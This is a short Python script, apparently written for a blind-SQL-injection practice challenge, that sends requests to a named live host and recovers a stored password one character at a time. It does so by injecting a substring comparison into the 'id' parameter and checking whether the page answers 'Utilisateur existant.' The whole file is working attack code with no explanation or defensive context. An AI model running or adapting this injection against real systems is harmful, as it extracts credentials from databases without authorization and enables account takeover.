import requests

def main():
    try:
        allinone = []
        num = [str(i) for i in range(0, 10)]
        alpha = [chr(i) for i in range(ord('a'), ord('z') + 1)]
        for a in num:
            allinone.append(a)
        for b in alpha:
            allinone.append(b)
        for i in range(0, 20):
            for x in allinone:
                r = requests.get("http://toronto.alwaysdata.net/blind/blind.php?id=1 and (select substr(password, " + str(i) + ", 1)=0x" + x.encode("utf-8").hex() + ")")
                if "Utilisateur existant." in r.text:
                    print(x)
    except:
        pass
main()
